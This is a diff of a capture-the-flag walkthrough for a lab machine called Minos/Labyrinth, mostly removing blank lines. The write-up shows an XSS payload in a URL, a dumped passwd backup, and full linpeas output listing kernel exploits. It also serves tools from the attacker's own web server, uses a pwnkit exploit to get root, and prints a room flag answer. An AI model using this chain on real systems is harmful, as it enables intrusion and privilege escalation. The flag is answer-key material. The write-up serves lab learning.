@@ -137,7 +137,6 @@ TO·GET·TO·KING·MINOS·YOU·MUST·FIRST·MAKE·USE·OF·THE·?KEY······
 [✓] parameter detected: key, based on: body length
 [+] Parameters found: key
 
-
 http://10.10.238.128:8080/?key=hi
 
 http://10.10.238.128:8080/?key=%3Cscript%3Ealert(window.origin)%3C/script%3E
@@ -428,7 +427,6 @@ on that you should have got earlier.
 Perhaps reading the story as you progress 
 will help you, Good luck hero!
 
-
 # cat passwd.bak
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -532,7 +530,6 @@ chmod +x linpeas.sh
 minos@Minos:/tmp$ ./linpeas.sh
 ./linpeas.sh
 
-
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
@@ -595,7 +592,6 @@ Writable folder: /dev/shm
 
 [+] nmap is available for network discovery & port scanning, you should use it yourself
 
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
 DONE
 
@@ -618,8 +614,6 @@ Sudo version 1.8.21p2
 Vulnerable to CVE-2021-4034
 
 Potentially Vulnerable to CVE-2022-2588
-
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
@@ -755,7 +749,6 @@ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
 
@@ -784,7 +777,6 @@ apparmor module is loaded.
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
 
-
                                      ╔═══════╗
 ═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                      ╚═══════╝
@@ -792,8 +784,6 @@ apparmor module is loaded.
 ═╣ AWS ECS? ............................. No
 
 ═╣ AWS Lambda? .......................... No
-
-
 
                 ╔════════════════════════════════════════════════╗
 ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
@@ -1019,7 +1009,6 @@ org.freedesktop.resolve1             175 systemd-resolve systemd-resolve  :1.1  
 org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
 org.freedesktop.timedate1              - -               -                (activatable) -                         -         
 
-
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -1061,7 +1050,6 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 3352547  bytes 259139377 (259.1 MB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      212/python          
@@ -1070,8 +1058,6 @@ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                               ╔═══════════════════╗
 ═══════════════════════════════╣ Users Information ╠═══════════════════════════════
@@ -1162,8 +1148,6 @@ Username         Port     From             Latest
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                              ╔══════════════════════╗
 ═════════════════════════════╣ Software Information ╠═════════════════════════════
                              ╚══════════════════════╝
@@ -1216,21 +1200,16 @@ ii  gcc-7                          7.5.0-3ubuntu1~18.04                amd64    
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 /ldap-xr-x 2 root root 3 Jul 29  2020 /etc
 
-
 ╔══════════╣ Searching ssl/ssh files
 ╔══════════╣ Analyzing SSH Files (limit 70)
-
 
 -rw-r--r-- 1 minos minos 444 Aug  4  2020 /home/minos/.ssh/known_hosts
 |1|kCPfpUuwUWs9TPNxBAoNx+DC0jI=|Gq93n+6YSFU7bdTbjOQk/qSgYz0= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=
 |1|PZPBF2IGn/hr7v6uZCduGH4OfDE=|PrkK9oac5PjihqdS0ul0LgWeYro= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=
-
-
 
 Port 22
 ListenAddress 0.0.0.0
@@ -1241,7 +1220,6 @@ UsePAM yes
 ══╣ Some certificates were found (out limited):
 /etc/pollinate/entropy.ubuntu.com.pem
 25937PSTORAGE_CERTSBIN
-
 
 /usr/share/openssh/sshd_config
 ChallengeResponseAuthentication no
@@ -1254,7 +1232,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -1265,13 +1242,9 @@ Host *
 drwxr-xr-x 2 root root 24 Jul 29  2020 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 2.6
-
 
 /tmp/tmux-1001
 ╔══════════╣ Analyzing Cloud Init Files (limit 70)
@@ -1281,9 +1254,6 @@ tmux 2.6
 lyzing Keyring Files (limit 70)
 drwxr-xr-x 3 root root 5 Aug  3  2020 /usr/lib/python2.7/dist-packages/keyrings
 drwxr-xr-x 2 root root 10 Jul 29  2020 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -1316,32 +1286,19 @@ drwx------ 3 minos minos 9 Jul  2 19:18 /home/minos/.gnupg
 
 -rw------- 1 minos minos 7005 Aug 20  2020 /home/minos/.viminfo
 
-
 ╔══════════╣ Analyzing Postfix Files (limit 70)
 -rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix
-
 
 ╔══════════╣ Analyzing Bind Files (limit 70)
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 
-
-
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
 [0m-r--r-- 1 minos minos 3771 Aug  3  2020 /home/minos/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
 -rw-r--r-- 1 minos minos 807 Aug  3  2020 /home/minos/.profile
-
-
-
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
@@ -1546,7 +1503,6 @@ drwx------ 2 minos minos    3 Aug  4  2020 .ssh
 ╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
 Found /var/lib/mlocate/mlocate.db: regular file, no read permission
 
-
 ╔══════════╣ Web files?(output limit)
 
  /sys/ or the ones listed in the previous check) (limit 70)
@@ -1685,13 +1641,10 @@ ntial-wincred.cgit/contrib/credential/wincred/git-crede
 2023-07-02 15:50:38,929 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
 2023-07-02 15:50:38,929 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
 
-
-
                                 ╔════════════════╗
 ════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                 ╚════════════════╝
 Regexes to search for API keys aren't activated, use param '-r' 
-
 
 nameserver 127.0.0.53
 lxd
@@ -1913,7 +1866,6 @@ Nmap scan report for Minos.lxd (10.71.235.7)
 Host is up.
 Nmap done: 256 IP addresses (4 hosts up) scanned in 4.81 seconds
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -1944,7 +1896,6 @@ Vulnerable to CVE-2021-4034
 Potentially Vulnerable to CVE-2022-2588
 
 -rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-
 
 ┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
 └─$ ls
@@ -2010,7 +1961,6 @@ root@Labyrinth:/tmp# grep -iRl "thm{" /home/* 2>/dev/null
 grep -iRl "thm{" /home/* 2>/dev/null
 /home/ariadne/Minotaur_Flag
 /home/minotaur/Labyrinth_Flag
-
 
 # cd /home
 # ls
@@ -2187,8 +2137,6 @@ MAC Address: 00:16:3E:9E:36:DA (Xensource)
 
 ```
 
-![[Pasted image 20230701231448.png]]
-
 What is the Minos flag?  
 
 *THM{499a89a2a064426921732e7d31bc08a} *
@@ -2204,12 +2152,5 @@ What is the Minotaur flag?
 What is the Athens flag?
 
 **
-
-
-
-
-
-
-
 
 [[You're in a cave]]
